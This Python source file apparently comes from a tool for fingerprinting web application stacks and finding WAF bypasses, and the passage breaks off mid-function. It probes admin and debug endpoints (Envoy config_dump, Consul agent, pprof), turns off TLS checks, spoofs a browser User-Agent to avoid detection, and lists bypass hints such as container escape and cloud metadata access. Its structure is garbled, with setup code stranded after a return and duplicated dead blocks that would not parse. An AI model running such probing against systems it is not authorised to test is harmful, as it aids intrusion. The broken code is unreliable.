#!/usr/bin/env python3
"""
Application Stack Traceroute & Bypass Generator
Next-Generation WAF/Proxy/Backend Chain Analysis Tool

Innovative Features:
- Maps complete request processing chain (WAF->CDN->Proxy->Backend)
- Identifies parsing discrepancies between layers
- Generates custom bypass payloads for each discovered discrepancy
- Protocol confusion testing (HTTP/1.1, HTTP/2, HTTP/3)
- Multi-layer encoding analysis
- Parser state machine confusion detection
- ENHANCED: Advanced bypass techniques based on deep discrepancies
- ENHANCED: JSON export for bypass automation
"""

import requests
import asyncio
import aiohttp
import json
import time
import base64
import urllib.parse
import zlib
import gzip
import random
import string
import socket
import ssl
import h2.connection
import h2.config
import re
import concurrent.futures
import threading
import queue
import logging
import uuid
import dns.resolver
import hashlib
from collections import defaultdict
from datetime import datetime
from urllib.parse import urlparse, urljoin
from typing import Dict, Optional, List, Set
import urllib3
import warnings


# Suppress SSL warnings for security testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore', message='Unverified HTTPS request')


class ServiceDiscoveryEnhanced:
    def __init__(self):
        self.discovered_services = set()
        self.service_tree = {}
        self.behavioral_cache = {}
        self.chain_graph = defaultdict(list)  # Multi-path routing
        self.max_depth = 15
        self.parallel_chains = []
        
        # Metodo per Header 
        self._init_header_utils()

        # Configure session with advanced settings
        self.session = requests.Session()
        self.session.timeout = 10
        self.session.verify = False
        
        # ML-inspired service classification weights
        self.ml_weights = {
            'header_patterns': 0.3,
            'response_patterns': 0.25,
            'behavioral_patterns': 0.25,
            'timing_patterns': 0.2
        }

        # Suppress SSL warnings during security testing
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
   
    def _init_header_utils(self):
        """Inizializza utilities per gestione header case-insensitive"""
        self.header_special_cases = {
        'cf-ray': 'CF-Ray',
        'cf-cache-status': 'CF-Cache-Status', 
        'x-amz-cf-id': 'X-Amz-CF-Id',
        'x-served-by': 'X-Served-By',
        'x-cache': 'X-Cache',
        'x-forwarded-for': 'X-Forwarded-For',
        'x-real-ip': 'X-Real-IP',
        'content-type': 'Content-Type',
        'user-agent': 'User-Agent',
        'www-authenticate': 'WWW-Authenticate'
        }

    def _normalize_headers(self, headers: dict) -> dict:
        """Normalizza header per matching case-insensitive"""
        normalized = {}
        for header_name, header_value in headers.items():
            key_normalized = header_name.lower().strip()
            normalized[key_normalized] = {
                'value': header_value,
                'original_header': header_name
            }
        return normalized

    def _get_header_safe(self, headers: dict, header_name: str) -> str:
        """AGGIUNGI QUESTO: Ottieni header value case-insensitive"""
        # Cerca match esatto prima
        if header_name in headers:
            return headers[header_name]
        
        # Cerca case-insensitive
        header_lower = header_name.lower()
        for key, value in headers.items():
            if key.lower() == header_lower:
                return value
        return None

        # Set realistic headers to avoid detection
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        
        # Advanced detection patterns
        # Miglioramenti per service_signatures mantenendo la struttura originale

        self.service_signatures = {
            'microservice': {
                'headers': [
                    'x-service-name', 'x-microservice', 'x-service-id', 'x-service-version',
                    'x-app-name', 'x-component', 'x-instance-id', 'service-name',
                    'x-correlation-id', 'x-trace-id', 'x-span-id'
                ],
                'paths': [
                    '/health', '/actuator/health', '/actuator/info', '/actuator/metrics',
                    '/metrics', '/status', '/ping', '/ready', '/live', '/healthz',
                    '/info', '/version', '/build-info', '/api/health', '/monitoring/health'
                ],
                'response_patterns': [
                    r'service.*running', r'microservice', r'api.*version', r'spring.*boot',
                    r'application.*name', r'build.*version', r'commit.*hash', r'instance.*id',
                    r'uptime', r'status.*up', r'healthy', r'node.*js', r'express.*js'
                ]
            },
            
            'api-gateway': {
                'headers': [
                    'x-gateway', 'x-api-gateway', 'x-kong', 'x-zuul', 'x-ambassador',
                    'x-tyk-gateway', 'x-apigateway', 'gateway-version', 'x-gateway-version',
                    'x-apigee', 'x-mashery', 'x-amazon-apigateway', 'x-azure-apim',
                    'x-gravitee', 'x-wso2'
                ],
                'behavioral': {
                    'rate_limiting': {
                        'headers': ['x-ratelimit', 'x-rate-limit', 'retry-after', 'x-ratelimit-remaining',
                                  'x-ratelimit-reset', 'x-rate-limit-limit', 'x-throttle'],
                        'response_codes': [429, 503],
                        'response_patterns': [r'rate.*limit.*exceeded', r'too.*many.*requests', 
                                            r'quota.*exceeded', r'throttled']
                    },
                    'request_id_propagation': {
                        'headers': ['x-request-id', 'x-correlation-id', 'x-trace-id', 'request-id',
                                  'x-amzn-requestid', 'x-ms-request-id', 'x-goog-request-id']
                    },
                    'cors_handling': {
                        'headers': ['access-control-allow-origin', 'access-control-allow-methods',
                                  'access-control-allow-headers', 'access-control-expose-headers'],
                        'preflight_support': True
                    },
                    'auth_delegation': {
                        'headers': ['www-authenticate', 'authorization', 'x-auth-token',
                                  'x-api-key', 'x-client-id'],
                        'oauth_patterns': [r'bearer.*token', r'oauth.*', r'jwt.*']
                    },
                    'response_transformation': True,
                    'request_routing': True,
                    'circuit_breaker': {
                        'response_patterns': [r'circuit.*breaker.*open', r'service.*unavailable',
                                            r'upstream.*error', r'backend.*timeout']
                    }
                },
                'paths': [
                    '/gateway', '/api/v1', '/api/v2', '/api/v3', '/graphql', '/.well-known/',
                    '/swagger', '/openapi', '/docs', '/api-docs', '/spec', '/schema',
                    '/admin', '/management', '/actuator', '/gateway/routes', '/routes'
                ],
                'response_patterns': [
                    r'gateway.*version', r'api.*documentation', r'swagger.*ui', r'openapi.*spec',
                    r'rate.*limit.*exceeded', r'upstream.*timeout', r'backend.*error',
                    r'routing.*error', r'service.*discovery', r'load.*balancer',
                    r'kong.*gateway', r'zuul.*proxy', r'ambassador.*gateway'
                ],
                'timing_signatures': {
                    'consistent_overhead': (50, 200),
                    'timeout_behavior': (5000, 30000),
                    'cache_layer_timing': (10, 100),
                    'auth_validation_time': (20, 500)
                },
                'version_patterns': {
                    'kong': r'kong/(\d+\.\d+\.\d+)',
                    'zuul': r'zuul.*(\d+\.\d+\.\d+)',
                    'envoy': r'envoy/(\d+\.\d+\.\d+)'
                }
            },

            'cdn_edge': {
                'headers': [
                    # Cloudflare
                    'cf-ray', 'cf-cache-status', 'cf-request-id', 'cf-visitor', 'cf-connecting-ip',
                    'cf-ipcountry', 'cf-ew-via', 'cf-polished', 'cf-bgj',
                    # AWS CloudFront
                    'x-amz-cf-id', 'x-amz-cf-pop', 'x-cache', 'x-amz-request-id',
                    'cloudfront-viewer-country', 'cloudfront-is-mobile-viewer',
                    # Fastly
                    'fastly-debug-path', 'fastly-debug-ttl', 'x-served-by', 'x-cache-hits',
                    'x-timer', 'fastly-restarts', 'x-cache-grace',
                    # Akamai
                    'x-akamai-transformed', 'x-akamai-request-id', 'akamai-origin-hop',
                    # Generic CDN
                    'x-edge-location', 'x-cdn-pop', 'x-edge-response-result-type',
                    'x-cache-status', 'x-cdn-cache-status'
                ],
                'behavioral': {
                    'cache_behavior': {
                        'cache_headers': ['cache-control', 'expires', 'etag', 'last-modified'],
                        'cache_status_values': ['HIT', 'MISS', 'EXPIRED', 'STALE', 'UPDATING', 'BYPASS'],
                        'ttl_headers': ['x-cache-ttl', 'x-ttl', 'age']
                    },
                    'geo_routing': {
                        'country_headers': ['cf-ipcountry', 'x-country-code', 'cloudfront-viewer-country'],
                        'pop_headers': ['x-pop', 'cf-ray', 'x-amz-cf-pop']
                    },
                    'ddos_protection': {
                        'challenge_patterns': [r'ddos.*protection', r'checking.*browser', r'cloudflare.*challenge'],
                        'security_headers': ['cf-ray', 'x-frame-options', 'x-content-type-options']
                    },
                    'compression': {
                        'encoding_headers': ['content-encoding', 'x-original-content-length'],
                        'compression_types': ['gzip', 'brotli', 'deflate']
                    },
                    'ssl_termination': True,
                    'waf_integration': True
                },
                'paths': [
                    '/cdn-cgi/', '/__cf_chl_jschl_tk__/', '/favicon.ico', '/robots.txt',
                    '/cache-status', '/edge-status', '/akamai/sureroute-test-object.html'
                ],
                'response_patterns': [
                    r'cloudflare', r'fastly.*error', r'cloudfront', r'akamai',
                    r'cache.*hit', r'cache.*miss', r'edge.*server', r'pop.*server',
                    r'cdn.*cache', r'origin.*server', r'edge.*location'
                ],
                'timing_signatures': {
                    'cache_hit': (5, 50),
                    'cache_miss': (100, 2000),
                    'edge_processing': (10, 100),
                    'origin_fetch': (200, 5000),
                    'ssl_handshake': (50, 300)
                },
                'error_patterns': {
                    'origin_errors': [r'origin.*unreachable', r'backend.*error', r'upstream.*error'],
                    'cache_errors': [r'cache.*error', r'storage.*error'],
                    'ddos_patterns': [r'rate.*limited', r'blocked.*request', r'suspicious.*activity']
                }
            },

            'container_orchestration': {
                'headers': [
                    # Kubernetes
                    'x-kubernetes', 'x-k8s', 'x-pod-name', 'x-namespace', 'x-node-name',
                    'x-cluster-name', 'x-service-account', 'x-deployment-name',
                    # Docker Swarm
                    'x-docker', 'x-container-id', 'x-service-name', 'x-task-id',
                    'x-network-id', 'x-swarm-node-id',
                    # ECS/Fargate
                    'x-ecs-task', 'x-ecs-container-name', 'x-aws-region', 'x-amzn-trace-id',
                    'x-ecs-cluster', 'x-fargate-task-arn',
                    # OpenShift
                    'x-openshift-build', 'x-openshift-project'
                ],
                'behavioral': {
                    'health_checks': {
                        'paths': ['/health', '/healthz', '/ready', '/live', '/readiness', '/liveness'],
                        'probe_types': ['readiness', 'liveness', 'startup']
                    },
                    'metrics_exposure': {
                        'paths': ['/metrics', '/prometheus', '/stats', '/monitoring'],
                        'formats': ['prometheus', 'json', 'text']
                    },
                    'service_discovery': {
                        'dns_patterns': [r'.*\.svc\.cluster\.local', r'.*\.internal', r'.*\.mesh'],
                        'consul_patterns': [r'.*\.service\.consul'],
                        'eureka_patterns': [r'.*\.eureka']
                    },
                    'rolling_updates': {
                        'version_headers': ['x-app-version', 'x-build-version', 'x-git-commit'],
                        'deployment_headers': ['x-deployment-id', 'x-rollout-id']
                    },
                    'load_balancing': {
                        'session_affinity': ['x-session-id', 'jsessionid', 'server-id'],
                        'load_balancer_headers': ['x-forwarded-for', 'x-real-ip']
                    },
                    'auto_scaling': True,
                    'resource_limits': True
                },
                'dns_patterns': [
                    r'.*\.svc\.cluster\.local',      # Kubernetes
                    r'.*\.internal',                 # Internal DNS
                    r'.*\.mesh',                     # Service mesh
                    r'.*\.swarm',                    # Docker Swarm
                    r'.*\.ecs\.internal',            # ECS internal
                    r'.*\.compute\.internal'         # AWS internal
                ],
                'paths': [
                    '/metrics', '/healthz', '/readyz', '/livez', '/status',
                    '/actuator/health', '/actuator/info', '/actuator/prometheus',
                    '/debug/pprof', '/debug/vars', '/stats', '/info'
                ],
                'response_patterns': [
                    r'kubernetes', r'k8s', r'pod.*name', r'namespace',
                    r'docker.*container', r'container.*id', r'deployment',
                    r'replica.*set', r'stateful.*set', r'daemon.*set',
                    r'fargate', r'ecs.*task', r'cluster.*arn'
                ],
                'timing_signatures': {
                    'startup_time': (1000, 30000),
                    'shutdown_graceful': (1000, 30000),
                    'health_check_interval': (1000, 60000),
                    'rolling_update_time': (10000, 300000)
                }
            },

            'serverless_function': {
                'headers': [
                    # AWS Lambda
                    'x-amzn-requestid', 'x-amzn-trace-id', 'x-lambda-request-id',
                    'x-amz-invocation-type', 'x-amz-function-version', 'x-amz-function-name',
                    'x-amzn-remapped-content-length', 'x-amzn-remapped-connection',
                    # Google Cloud Functions
                    'function-execution-id', 'x-cloud-trace-context', 'x-goog-', 'x-appengine-',
                    'x-cloud-run-revision', 'x-serverless-runtime-version',
                    # Azure Functions
                    'x-azure-requestid', 'x-ms-request-id', 'x-ms-invocation-id',
                    'x-azure-functions-', 'x-ms-execution-context-invocationid',
                    # Vercel/Netlify
                    'x-vercel-', 'x-now-', 'x-nf-', 'x-netlify-'
                ],
                'behavioral': {
                    'cold_start_detection': {
                        'timing_variance': True,
                        'initialization_patterns': [r'cold.*start', r'function.*init', r'runtime.*init']
                    },
                    'execution_time_patterns': {
                        'timeout_headers': ['x-amzn-timeout', 'x-function-timeout'],
                        'execution_time_headers': ['x-execution-time', 'x-duration']
                    },
                    'memory_constraints': {
                        'memory_headers': ['x-max-memory', 'x-memory-limit'],
                        'oom_patterns': [r'memory.*limit', r'out.*of.*memory', r'heap.*exhausted']
                    },
                    'concurrent_execution': {
                        'concurrency_headers': ['x-concurrency-limit', 'x-reserved-concurrency'],
                        'throttling_patterns': [r'throttled', r'concurrent.*limit', r'rate.*exceeded']
                    },
                    'event_sources': {
                        'triggers': ['api-gateway', 'sqs', 's3', 'dynamodb', 'eventbridge', 'http']
                    }
                },
                'paths': [
                    '/api/', '/function/', '/.netlify/functions/', '/api/v1/',
                    '/.vercel/output/functions/', '/lambda/', '/azure-functions/',
                    '/gcf/', '/cloud-function/'
                ],
                'response_patterns': [
                    r'lambda.*timeout', r'function.*invocation', r'cold.*start',
                    r'execution.*time', r'memory.*limit', r'concurrent.*execution',
                    r'serverless.*runtime', r'function.*error', r'handler.*error',
                    r'cloud.*function', r'azure.*function', r'vercel.*function'
                ],
                'timing_signatures': {
                    'cold_start_penalty': (100, 3000),
                    'warm_execution': (5, 100),
                    'timeout_behavior': (15000, 900000),  # 15s to 15min
                    'billed_duration': (100, 900000)
                },
                'error_patterns': {
                    'timeout_errors': [r'task.*timed.*out', r'function.*timeout', r'execution.*timeout'],
                    'memory_errors': [r'memory.*exhausted', r'out.*of.*memory', r'heap.*limit'],
                    'runtime_errors': [r'runtime.*error', r'handler.*not.*found', r'module.*error']
                }
            },

            'load-balancer': {
                'headers': [
                    'X-Load-Balancer', 'X-Forwarded-By', 'x-lb', 'x-lb-name',
                    'X-haproxy', 'x-nginx-lb', 'X-real-ip', 'X-Forwarded-For',
                    'X-Forwarded-Proto', 'X-Forwarded-Host', 'X-Forwarded-Port',
                    'X-original-forwarded-for', 'X-cluster-client-ip',
                    'X-aws-alb-target-group-arn', 'X-amzn-trace-id'
                ],
                'behavioral': {
                    'session_persistence': {
                        'cookies': ['AWSALB', 'AWSALBCORS', 'lb-session', 'server-id'],
                        'headers': ['x-session-affinity', 'x-sticky-session']
                    },
                    'health_checking': {
                        'paths': ['/lb-status', '/health', '/check'],
                        'response_patterns': [r'healthy', r'available', r'up']
                    },
                    'ssl_termination': {
                        'headers': ['x-forwarded-proto', 'x-scheme'],
                        'termination_patterns': [r'ssl.*terminated', r'https.*offload']
                    },
                    'load_balancing_algorithms': ['round-robin', 'least-connections', 'ip-hash', 'weighted'],
                    'failover_behavior': True
                },
                'paths': [
                    '/lb-status', '/haproxy?stats', '/nginx_status', '/status',
                    '/health', '/load-balancer/health', '/elb-status'
                ],
                'response_patterns': [
                    r'load.*balance', r'upstream', r'backend.*pool', r'server.*pool',
                    r'haproxy', r'nginx.*lb', r'aws.*application.*load.*balancer',
                    r'target.*group', r'health.*check', r'failover'
                ],
                'timing_signatures': {
                    'health_check_interval': (5000, 30000),
                    'failover_detection': (1000, 10000),
                    'connection_draining': (5000, 300000)
                }
            },

            'service-mesh': {
                'headers': [
                    # Istio/Envoy
                    'x-envoy', 'x-envoy-upstream-service-time', 'x-envoy-original-path',
                    'x-envoy-decorator-operation', 'x-envoy-peer-metadata',
                    'x-istio-attributes', 'istio-mtls',
                    # Linkerd
                    'l5d-dst-service', 'l5d-dst-client', 'l5d-request-id',
                    'l5d-ctx-trace', 'x-linkerd-', 'linkerd-',
                    # Consul Connect
                    'x-consul-', 'consul-', 'x-consul-token', 'x-consul-index',
                    # Generic tracing
                    'x-b3-traceid', 'x-b3-spanid', 'x-b3-parentspanid', 'x-b3-sampled',
                    'x-ot-span-context', 'x-trace-id', 'x-span-id'
                ],
                'behavioral': {
                    'mtls_termination': {
                        'cert_headers': ['x-forwarded-client-cert', 'x-ssl-client-cert'],
                        'mtls_patterns': [r'mtls.*enabled', r'mutual.*tls', r'client.*cert']
                    },
                    'circuit_breaking': {
                        'response_patterns': [r'circuit.*breaker', r'upstream.*failure', r'max.*retries'],
                        'status_codes': [503, 504]
                    },
                    'retry_policies': {
                        'retry_headers': ['x-envoy-retry-on', 'x-envoy-max-retries'],
                        'retry_patterns': [r'retry.*policy', r'max.*retries', r'retry.*timeout']
                    },
                    'canary_routing': {
                        'routing_headers': ['x-canary-weight', 'x-traffic-split'],
                        'version_headers': ['x-version', 'x-variant']
                    },
                    'fault_injection': {
                        'fault_headers': ['x-envoy-fault-', 'x-chaos-'],
                        'fault_patterns': [r'fault.*injection', r'chaos.*engineering']
                    },
                    'observability': {
                        'metrics_collection': True,
                        'distributed_tracing': True,
                        'access_logging': True
                    }
                },
                'admin_paths': [
                    '/stats', '/clusters', '/config_dump', '/server_info',
                    '/listeners', '/runtime', '/certs', '/memory', '/cpuprofiler',
                    '/ready', '/stats/prometheus', '/hot_restart_version'
                ],
                'response_patterns': [
                    r'envoy.*proxy', r'istio', r'linkerd', r'consul.*connect',
                    r'service.*mesh', r'sidecar.*proxy', r'data.*plane',
                    r'control.*plane', r'xds.*config', r'pilot.*discovery'
                ],
                'timing_signatures': {
                    'proxy_overhead': (1, 50),
                    'circuit_breaker_trip': (100, 1000),
                    'retry_backoff': (100, 5000),
                    'config_reload': (1000, 30000)
                }
            },

            'database-proxy': {
                'headers': [
                    'x-db-proxy', 'x-pgbouncer', 'x-mysql-proxy', 'x-redis-proxy',
                    'x-connection-pool', 'x-db-connection-id', 'x-query-cache',
                    'x-db-server', 'x-shard-key'
                ],
                'behavioral': {
                    'connection_pooling': {
                        'pool_headers': ['x-pool-size', 'x-active-connections', 'x-idle-connections'],
                        'pool_patterns': [r'connection.*pool', r'max.*connections', r'pool.*exhausted']
                    },
                    'query_caching': {
                        'cache_headers': ['x-query-cache-hit', 'x-cache-ttl'],
                        'cache_patterns': [r'query.*cache', r'cache.*hit', r'cache.*miss']
                    },
                    'sharding': {
                        'shard_headers': ['x-shard-id', 'x-partition-key'],
                        'shard_patterns': [r'shard.*key', r'partition.*strategy']
                    },
                    'read_write_split': True,
                    'failover_support': True
                },
                'paths': [
                    '/db-status', '/pool-status', '/pgbouncer', '/mysql-proxy/status',
                    '/redis-info', '/connection-stats', '/query-stats'
                ],
                'response_patterns': [
                    r'database.*proxy', r'connection.*pool', r'pgbouncer', r'mysql.*proxy',
                    r'redis.*proxy', r'db.*connection', r'query.*cache', r'shard.*info'
                ],
                'timing_signatures': {
                    'connection_setup': (10, 100),
                    'query_execution': (1, 5000),
                    'pool_checkout': (1, 50)
                }
            },

            'cache-layer': {
                'headers': [
                    'x-cache', 'x-redis', 'x-memcached', 'x-varnish', 'x-cache-status',
                    'x-cache-key', 'x-cache-ttl', 'x-cache-hits', 'x-cache-age',
                    'varnish-age', 'varnish-cache', 'x-drupal-cache'
                ],
                'behavioral': {
                    'cache_strategies': {
                        'strategies': ['write-through', 'write-behind', 'cache-aside'],
                        'invalidation_patterns': [r'cache.*invalidate', r'purge.*cache', r'flush.*cache']
                    },
                    'cache_warming': {
                        'warming_patterns': [r'cache.*warm', r'preload.*cache'],
                        'warming_headers': ['x-cache-warmed', 'x-preload-status']
                    },
                    'distributed_cache': {
                        'cluster_headers': ['x-cache-node', 'x-cluster-id'],
                        'replication_patterns': [r'cache.*replica', r'sync.*status']
                    },
                    'compression': True,
                    'serialization': ['json', 'binary', 'protobuf']
                },
                'paths': [
                    '/cache-status', '/redis-info', '/memcached-stats', '/varnish-stats',
                    '/cache-stats', '/hit-ratio', '/memory-usage'
                ],
                'response_patterns': [
                    r'redis', r'memcached', r'varnish', r'cache.*hit', r'cache.*miss',
                    r'cache.*server', r'key.*value', r'cache.*cluster', r'hit.*ratio'
                ],
                'timing_signatures': {
                    'cache_hit': (1, 10),
                    'cache_miss': (10, 1000),
                    'cache_write': (1, 50),
                    'eviction_time': (1, 100)
                }
            },

            'message-queue': {
                'headers': [
                    'x-queue', 'x-rabbitmq', 'x-kafka', 'x-sqs', 'x-pubsub',
                    'x-message-id', 'x-correlation-id', 'x-delivery-tag',
                    'x-queue-name', 'x-topic-name', 'x-partition'
                ],
                'behavioral': {
                    'async_processing': {
                        'async_patterns': [r'async.*process', r'background.*job', r'queued.*task'],
                        'callback_headers': ['x-callback-url', 'x-webhook-url']
                    },
                    'message_ordering': {
                        'order_headers': ['x-sequence-number', 'x-message-order'],
                        'fifo_patterns': [r'fifo.*queue', r'ordered.*delivery']
                    },
                    'dead_letter_queues': {
                        'dlq_headers': ['x-dlq-retry-count', 'x-dead-letter-queue'],
                        'dlq_patterns': [r'dead.*letter', r'retry.*exhausted', r'poison.*message']
                    },
                    'batch_processing': {
                        'batch_headers': ['x-batch-size', 'x-batch-id'],
                        'batch_patterns': [r'batch.*process', r'bulk.*operation']
                    },
                    'message_persistence': True,
                    'acknowledgment_modes': ['auto', 'manual', 'duplicates-ok']
                },
                'paths': [
                    '/queue-status', '/rabbitmq/api', '/kafka/topics', '/sqs/stats',
                    '/pubsub/topics', '/messages', '/queues', '/topics'
                ],
                'response_patterns': [
                    r'rabbitmq', r'kafka', r'amazon.*sqs', r'google.*pubsub',
                    r'message.*queue', r'topic.*partition', r'consumer.*group',
                    r'producer', r'subscriber', r'dead.*letter'
                ],
                'timing_signatures': {
                    'queue_processing': (10, 5000),
                    'batch_delay': (100, 10000),
                    'message_latency': (1, 1000),
                    'consumer_lag': (0, 300000)
                }
            }
        }        
        # Container orchestration signatures
        self.container_patterns = {
            'kubernetes': {
                'headers': ['x-kubernetes', 'x-k8s', 'x-pod-name', 'x-namespace'],
                'dns_patterns': [r'.*\.svc\.cluster\.local'],
                'paths': ['/metrics', '/healthz'],
                'env_indicators': ['KUBERNETES_SERVICE', 'POD_NAME', 'NAMESPACE']
            },
            'docker': {
                'headers': ['x-container-id', 'x-docker', 'x-container-name'],
                'paths': ['/docker-health', '/container-info'],
                'response_patterns': ['container.*id', 'docker.*image']
            },
            'ecs': {
                'headers': ['x-amzn-trace-id', 'x-ecs-task', 'x-aws-region'],
                'paths': ['/task-metadata', '/stats'],
                'response_patterns': ['ecs.*task', 'aws.*fargate']
            },
            'cloud-run': {
                'headers': ['x-cloud-run', 'x-goog-', 'function-execution-id'],
                'paths': ['/metadata', '/health'],
                'response_patterns': ['cloud.*run', 'google.*cloud']
            }
        }

    def discover_backend_chain(self, entry_point: str, depth: int = 0) -> Dict:
        if depth >= self.max_depth or entry_point in self.discovered_services:
            return {}
        
        self.discovered_services.add(entry_point)
        service_info = self._analyze_service(entry_point)
        self.service_tree[entry_point] = service_info
        
        next_hop = self._find_next_service(service_info)
        if next_hop:
            self.discover_backend_chain(next_hop, depth + 1)
        
        return self.service_tree

    def _analyze_service(self, endpoint: str) -> Dict:
        """Ultra-advanced service analysis with multi-vector detection"""
        return {
            'type': self._detect_service_type(endpoint),
            'container_info': self._get_container_info(endpoint),
            'service_mesh_info': self._get_service_mesh_info(endpoint),
            'next_hop': None,
            'endpoint': endpoint,
            'timestamp': int(time.time())
        }

    def _detect_service_type(self, endpoint: str) -> str:
        """Multi-layered service type detection with forensic precision"""
        detection_scores = {}
        
        try:
            # Phase 1: Header-based detection
            response = self._safe_request('GET', endpoint, timeout=5)
            if not response:
                return 'unknown'
            
            headers_normalized = self._normalize_headers(response.headers)

            # Score each service type based on header signatures
            for service_type, signatures in self.service_signatures.items():
                score = 0
                
                # Header analysis
                for header_pattern in signatures['headers']:
                    pattern_lower = header_pattern.lower()
                    
                    # Check exact match
                    if pattern_lower in headers_normalized:
                        score += 10
                        continue
                    
                    # Check partial matches per header complessi
                    for normalized_key, header_data in headers_normalized.items():
                        header_value = header_data['value'].lower()
                        
                        # Pattern nel nome header
                        if pattern_lower in normalized_key:
                            score += 8
                        
                        # Pattern nel valore header
                        elif pattern_lower in header_value:
                            score += 6

                # Response content analysis
                response_text = response.text.lower()
                for pattern in signatures['response_patterns']:
                    if re.search(pattern, response_text):
                        score += 5
                
                detection_scores[service_type] = score
            
            # Phase 2: Endpoint probing for confirmation
            parsed_url = urlparse(endpoint)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            for service_type, signatures in self.service_signatures.items():
                for probe_path in signatures['paths']:
                    probe_url = urljoin(base_url, probe_path)
                    probe_response = self._safe_request('GET', probe_url, timeout=3)
                    
                    if probe_response and probe_response.status_code == 200:
                        detection_scores[service_type] = detection_scores.get(service_type, 0) + 15

            if detection_scores:
                return max(detection_scores.items(), key=lambda x: x[1])[0]
            
            return 'unknown'
            
        except Exception as e:
            return 'error'

       #     Deep content analysis of probe responses
            probe_text = probe_response.text.lower()
            for pattern in signatures['response_patterns']:
                if re.search(pattern, probe_text):
                    detection_scores[service_type] += 10
                    
            # Phase 3: Advanced behavior analysis
            # Check for REST API patterns
            if self._is_rest_api(endpoint):
                detection_scores['microservice'] = detection_scores.get('microservice', 0) + 8
            
            # Check for GraphQL
            if self._is_graphql(endpoint):
                detection_scores['api-gateway'] = detection_scores.get('api-gateway', 0) + 12
            
            # Check for WebSocket support
            if self._supports_websocket(endpoint):
                detection_scores['microservice'] = detection_scores.get('microservice', 0) + 6
            
            # Phase 4: Return highest scoring service type
            if detection_scores:
                return max(detection_scores.items(), key=lambda x: x[1])[0]
            
            return 'unknown'
            
        except Exception as e:
            return 'error'

    def _get_container_info(self, endpoint: str) -> Dict:
        """Advanced container orchestration detection with scoring"""
        container_info = {
            'orchestrator': 'unknown',
            'container_id': None,
            'image': None,
            'namespace': None,
            'cluster': None,
            'bypass_hints': []
        }

        try:
            response = self._safe_request('GET', endpoint, timeout=5)
            if not response:
                return container_info

            headers = self._normalize_headers(response.headers)
            body = response.text.lower()
            parsed_url = urlparse(endpoint)
            hostname = parsed_url.hostname or ""

            score_map = {
                'kubernetes': 0,
                'docker': 0,
                'ecs': 0
            }

            # Header-based detection
            header_checks = {
                'kubernetes': ['x-kubernetes', 'x-k8s', 'x-pod-name', 'x-namespace'],
                'docker': ['x-container-id', 'x-docker'],
                'ecs': ['x-ecs-task', 'x-amzn-trace-id']
            }

            for kind, patterns in header_checks.items():
                for pattern in patterns:
                    if pattern.lower() in headers:
                        score_map[kind] += 10
                        if kind == 'kubernetes':
                            if 'pod-name' in pattern.lower():
                                container_info['container_id'] = headers[pattern.lower()]['value']
                            if 'namespace' in pattern.lower():
                                container_info['namespace'] = headers[pattern.lower()]['value']
                        elif kind == 'docker':
                            if 'container-id' in pattern.lower():
                                container_info['container_id'] = headers[pattern.lower()]['value']

            # DNS pattern (Kubernetes)
            if '.svc.cluster.local' in hostname:
                score_map['kubernetes'] += 15
                container_info['cluster'] = 'detected'
                parts = hostname.split('.')
                if len(parts) >= 3:
                    container_info['namespace'] = parts[1]

            # Body pattern detection
            body_patterns = {
                'kubernetes': [r'kubernetes', r'pod.*name', r'namespace', r'cluster'],
                'docker': [r'docker.*container', r'container.*id'],
                'ecs': [r'ecs.*task', r'fargate', r'taskarn', r'aws.*region']
            }

            for kind, patterns in body_patterns.items():
                for pattern in patterns:
                    if re.search(pattern, body):
                        score_map[kind] += 5

            # Health/metrics endpoints
            probe_paths = {
                'kubernetes': ['/metrics', '/healthz', '/readyz', '/livez'],
                'docker': ['/docker-health', '/container-info'],
                'ecs': ['/task-metadata', '/stats']
            }

            for kind, paths in probe_paths.items():
                for path in paths:
                    probe_url = urljoin(f"{parsed_url.scheme}://{parsed_url.netloc}", path)
                    probe_response = self._safe_request('GET', probe_url, timeout=3)
                    if probe_response and probe_response.status_code == 200:
                        score_map[kind] += 5
                        if 'prometheus' in probe_response.text.lower() or '# TYPE' in probe_response.text:
                            score_map[kind] += 5

            # Final decision
            detected = max(score_map.items(), key=lambda x: x[1])
            if detected[1] >= 10:
                container_info['orchestrator'] = detected[0]

            # Bypass hints
            hints = {
                'kubernetes': [
                    'internal_service_communication',
                    'cluster_internal_dns',
                    'service_mesh_bypass',
                    'pod_to_pod_direct'
                ],
                'docker': [
                    'container_network_bypass',
                    'docker_api_exposure',
                    'container_escape_vectors'
                ],
                'ecs': [
                    'aws_metadata_service',
                    'task_role_assumption',
                    'ecs_service_discovery'
                ]
            }

            container_info['bypass_hints'] = hints.get(container_info['orchestrator'], [])
            return container_info

        except Exception as e:
            container_info['error'] = str(e)
            return container_info


    def _get_service_mesh_info(self, endpoint: str) -> Dict:
        """Detect service mesh layer with enhanced fingerprinting"""
        mesh_info = {
            'service_mesh': 'unknown',
            'sidecar': None,
            'version': None,
            'bypass_hints': []
        }

        try:
            response = self._safe_request('GET', endpoint, timeout=5)
            if not response:
                return mesh_info

            headers = self._normalize_headers(response.headers)
            body = response.text.lower()
            score_map = {
                'istio': 0,
                'linkerd': 0,
                'consul': 0
            }

            # --- Header detection ---
            header_patterns = {
                'istio': ['x-envoy-peer-metadata', 'x-envoy-attempt-count', 'x-request-id', 'x-b3-traceid'],
                'linkerd': ['l5d-ctx-trace', 'l5d-dst-override'],
                'consul': ['x-consul-default', 'x-consul-trace']
            }

            for mesh, patterns in header_patterns.items():
                for pattern in patterns:
                    if pattern in headers:
                        score_map[mesh] += 5

            # --- Body-based detection ---
            body_patterns = {
                'istio': [r'istio', r'envoy', r'pilot', r'istiod', r'mesh'],
                'linkerd': [r'linkerd', r'outbound', r'proxy', r'service-profile'],
                'consul': [r'consul', r'sidecar', r'connect', r'envoy']
            }

            for mesh, patterns in body_patterns.items():
                for pattern in patterns:
                    if re.search(pattern, body):
                        score_map[mesh] += 2

            # --- Probe endpoints for control planes ---
            control_plane_probes = {
                'istio': ['/stats', '/config_dump'],
                'linkerd': ['/metrics', '/proxy-log-level'],
                'consul': ['/v1/agent/self', '/v1/catalog/nodes']
            }

            parsed_url = urlparse(endpoint)
            for mesh, paths in control_plane_probes.items():
                for path in paths:
                    probe_url = urljoin(f"{parsed_url.scheme}://{parsed_url.netloc}", path)
